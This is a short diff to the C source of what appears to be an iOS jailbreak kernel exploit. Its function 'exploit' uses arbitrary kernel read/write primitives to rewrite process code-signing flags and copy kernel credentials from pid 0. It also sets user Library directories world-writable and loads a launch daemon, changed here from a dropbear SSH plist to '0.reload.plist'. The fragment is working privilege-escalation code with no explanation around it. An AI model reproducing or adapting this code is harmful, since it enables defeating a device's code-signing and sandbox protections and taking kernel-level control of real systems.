@@ -135,7 +135,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
         csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
         WriteAnywhere32(proc+0x2a8, csflags);
-        if (pid == 1) {
+        if (pid == 0) {
             credpatch = ReadAnywhere64(proc+0x100);
             break;
         }
@@ -779,7 +779,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     chmod("/private/var/mobile/Library", 0777);
     chmod("/private/var/mobile/Library/Preferences", 0777);
     
-    system("(sleep 1; echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/dropbear.plist)&");
+    system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
     WriteAnywhere64(bsd_task+0x100, orig_cred);
     sleep(2);
 
